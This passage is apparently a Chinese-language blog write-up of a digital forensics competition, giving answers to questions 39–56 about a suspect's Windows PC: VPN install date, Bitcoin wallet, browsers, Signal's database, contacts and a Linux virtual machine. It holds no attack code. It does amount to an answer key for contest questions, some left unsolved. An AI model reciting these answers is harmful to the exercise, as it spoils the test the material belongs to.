&lt;/h1&gt;&lt;h2 id=&#34;39林浚熙计算机computer-的操作系统operating-system-版本是什么&#34;&gt;39.林浚熙计算机(Computer) 的操作系统(Operating System) 版本是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. Windows 10 Pro for Workstations 21H2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. Windows 10 Pro 22H2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. Windows 10 Home 21H2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. Windows 10 Pro for Workstations 21H1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815101130265&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815101130265.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815101130265.png&#34; alt=&#34;image-20250815101130265&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;操作系统名称为Windows 10 Pro for Workstations，当前Build版本号是&lt;code&gt;19044.2130&lt;/code&gt;，这是Windows 10 21H2的一个更新版本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;A&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;40林浚照计算机安装了什么品牌的虚拟专用网络-virtual-private-network---vpn软件不要输入符号及空白以大写英文及阿拉伯数字回答&#34;&gt;40.林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN)软件?(不要输入符号及空白，以大写英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;火眼支持详细分析的软件里面没有vpn，但在用户桌面找到一个快捷方式，ExpressVPN：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815140909760&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815140909760.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815140909760.png&#34; alt=&#34;image-20250815140909760&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;为了保险起见（万一名称不完整），文件系统里面搜一下，确实是vpn：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815141014058&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815141014058.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815141014058.png&#34; alt=&#34;image-20250815141014058&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ExpressVPN
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;41承上题分析该虚拟专用网络的日志log他在哪天安装该虚拟专用网络如答案为-2022-12-29需回答-20221229&#34;&gt;41.承上题，分析该虚拟专用网络的日志(Log)，他在哪天安装该虚拟专用网络?(如答案为 2022-12-29，需回答 20221229)
&lt;/h2&gt;&lt;p&gt;log那么长谁看啊，直接火眼基本信息里看安装软件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815141230031&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815141230031.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815141230031.png&#34; alt=&#34;image-20250815141230031&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;20220915
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;42检视林浚照计算机的数据他使用哪种加密货币cryptocurrency-以支付虚拟专用网络软件以大写英文回答该加密货币的全名如-bitcoin&#34;&gt;42.检视林浚照计算机的数据，他使用哪种加密货币(Cryptocurrency) 以支付虚拟专用网络软件?以大写英文回答该加密货币的全名，如 BITCOIN)
&lt;/h2&gt;&lt;p&gt;电脑里面有四个浏览器，一个个搜索，最终在chrome里面搜索出来了：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815142103333&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815142103333.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815142103333.png&#34; alt=&#34;image-20250815142103333&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bitcoin
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;话说这不就是题目示例的吗，心理战这一块&lt;/p&gt;
&lt;h2 id=&#34;43林浚熙的加密货币钱包cryptocurrency-wallet-名称是什么不要输入符号以大写英文及阿拉伯数字回答&#34;&gt;43.林浚熙的加密货币钱包Cryptocurrency Wallet) 名称是什么?不要输入符号，以大写英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;火眼里面找不到什么有用的信息，仿真进入电脑桌面看一下：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815142922761&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815142922761.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815142922761.png&#34; alt=&#34;image-20250815142922761&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;看到了老熟人vpn，还有一个未知软件electrum，上网搜一下：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815143140498&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815143140498.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815143140498.png&#34; alt=&#34;image-20250815143140498&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这就是电子钱包了，打开看看：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815143332389&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815143332389.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815143332389.png&#34; alt=&#34;image-20250815143332389&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;Wallet后的就是钱包名了，后面还有密码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;TELLAW_IEH
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不过题目说不要输入符号，不知道是什么意思&lt;/p&gt;
&lt;h2 id=&#34;44林浚熙计算机里安装了哪个浏览器web-browser&#34;&gt;44.林浚熙计算机里安装了哪个浏览器(Web Browser)?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.Tor Browser&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.Opera&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.Google Chrome&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.Internet Explorer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E.Microsoft Edge&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前文找使用的电子货币的时候已经说过了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ACDE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;45林浚熙使用浏览器google-chrome曾经浏览最多的是哪-个网站&#34;&gt;45.林浚熙使用浏览器Google Chrome曾经浏览最多的是哪 个网站?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. &lt;a class=&#34;link&#34; href=&#34;https://gmail.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gmail.com
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. &lt;a class=&#34;link&#34; href=&#34;https://mail.google.com/mail&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://mail.google.com/mail
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. &lt;a class=&#34;link&#34; href=&#34;https://web.whatsapp.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://web.whatsapp.com
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. &lt;a class=&#34;link&#34; href=&#34;https://facebook.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://facebook.com
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815164109918&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815164109918.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815164109918.png&#34; alt=&#34;image-20250815164109918&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;46除了上述网站林浚熙曾使用浏览器google-chrome搜索过什么&#34;&gt;46.除了上述网站,林浚熙曾使用浏览器Google Chrome搜索过什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. javascript教学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. php sql教学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. tor教学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. docker image教学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;E. electrum教学&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个个搜就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BCDE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;47林浚照的计算机安装了一个通讯软件signal它的用户资讯储存路径是什么&#34;&gt;47.林浚照的计算机安装了一个通讯软件Signal，它的用户资讯储存路径是什么?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.\Users\HEI\AppData\Roaming\Signal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.\Program Files(x86)\Signal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.\Users\HEI\Desktop\Signal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.\Users\user\Roaming\Signal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们在signal里面随便点开一个联系人，就能看见存储路径：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815164601797&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815164601797.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815164601797.png&#34; alt=&#34;image-20250815164601797&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;48通讯软件signal采用一个档案存放用户的聊天记录它的档案名是什么不要输入以大写英文及阿拉伯数字回答如cat10jpg需回答cat10jpg&#34;&gt;48.通讯软件Signal采用一个档案存放用户的聊天记录，它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG)
&lt;/h2&gt;&lt;p&gt;打开私聊消息，右键任意消息记录，点击跳转到源文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815164744455&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815164744455.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815164744455.png&#34; alt=&#34;image-20250815164744455&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;原来就是上一题看到过的db.sqlite：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815164826105&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815164826105.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815164826105.png&#34; alt=&#34;image-20250815164826105&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DBSQLITE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;49承上题对上档案进行分析林发熙的联络人当中有多少人安装了siqnal以阿拉伯数字回答&#34;&gt;49.承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了Siqnal?(以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;很奇怪，不知道这题想问什么，联络人指的是林俊熙手机的联络人吗，那比对一下：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815170230481&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815170230481.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815170230481.png&#34; alt=&#34;image-20250815170230481&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815170355323&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815170355323.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815170355323.png&#34; alt=&#34;image-20250815170355323&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这四个人的电话（+852）和昵称都对得上，那应该是四个&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另外，上一题的db文件打不开，经检查发现不是sqlite格式，也不是其他常见文件格式，不知道有什么猫腻&lt;/p&gt;
&lt;h2 id=&#34;50林浚熙在signal-曾经与某人对话那人的手机号码是什么-需要与区码area-code-一同答以阿拉伯数字&#34;&gt;50.林浚熙在“Signal&amp;rsquo; 曾经与某人对话，那人的手机号码是什么? 需要与区码(Area Code) 一同答(以阿拉伯数字)
&lt;/h2&gt;&lt;p&gt;上面过程中已经找过，是ROCKY，不多赘述：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;85270711901
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;51承上题两人在signal-的对话中有些讯息message-包含附件这些讯息的-id包括&#34;&gt;51.承上题，两人在Signal&amp;rsquo; 的对话中有些讯息(Message) 包含附件，这些讯息的 &amp;lsquo;ID&amp;rsquo;包括?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.5b9650fe-3bb6-4182-9900-f56177003672&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.46a8762b-78ea-49aa-a6f5-b24975ec189f&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.9729bf92-ab9c-45f7-8147-66234296aele&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.47233ffe-1a73-4b3d-b97c-626246ec3129&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;完蛋了，db.sqlite文件打不开，做不了，难道是有隐写吗？可是也没发现任何线索&lt;/p&gt;
&lt;h2 id=&#34;52承上题林浚熙曾经于2022年10月20日转账transfer-money-予上述对话人士那次转账的参考编号是什么以大写英文及阿拉伯数字回答&#34;&gt;52.承上题，林浚熙曾经于2022年10月20日转账（Transfer Money) 予上述对话人士,那次转账的参考编号是什么?(以大写英文及阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815171907283&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815171907283.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815171907283.png&#34; alt=&#34;image-20250815171907283&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;N91088774024
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;林浚熙的vm53-70&#34;&gt;林浚熙的VM(53-70)
&lt;/h1&gt;&lt;h2 id=&#34;53林浚熙的计算机安装了多少台虚拟机virtual-machine---vm-以阿拉伯数字回答&#34;&gt;53.林浚熙的计算机安装了多少台虚拟机Virtual Machine - VM) ?(以阿拉伯数字回答)
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. 4&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. 2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. 3&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815172044023&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815172044023.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815172044023.png&#34; alt=&#34;image-20250815172044023&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;54林浚熙的计算机里的虚拟机vm-存放在什么路径&#34;&gt;54.林浚熙的计算机里的虚拟机(VM) 存放在什么路径?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A.\Users\Public\Documents \Virtual Machines&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B.\Program Files\Virtual Machines&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C.\User\HEN\Roaming\Virtual Machines\&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D.\Users\HEN\Documents\Virtual Machines&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815172157027&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815172157027.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815172157027.png&#34; alt=&#34;image-20250815172157027&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;到底是HEI还是HEN？应该是题目搞错了&lt;/p&gt;
&lt;h2 id=&#34;55虚拟机-vm-使用什么版本的作业系统operating-system-&#34;&gt;55.虚拟机 (VM) 使用什么版本的作业系统(Operating System) ?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. CentOs Linux 7.5.1804 (Core)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. Ubuntu 22.04.1 LTS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. CentOS Linux release 7.6.1810(Core)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. Ubuntu 20.04.5 LTS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;把这个.vmdk添加为新检材，查看基本信息：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250815172918865&#34; href=&#34;http://picture.928330.xyz/typora/image-20250815172918865.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250815172918865.png&#34; alt=&#34;image-20250815172918865&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;56虚拟机vm-中的文件传输服务器ftp-server-有哪些用户&#34;&gt;56.虚拟机(VM) 中的文件传输服务器(FTP Server) 有哪些用户?
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;A. nobody&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. root&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;C. admin&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;D. man&lt;/strong&gt;&lt;/p&gt;
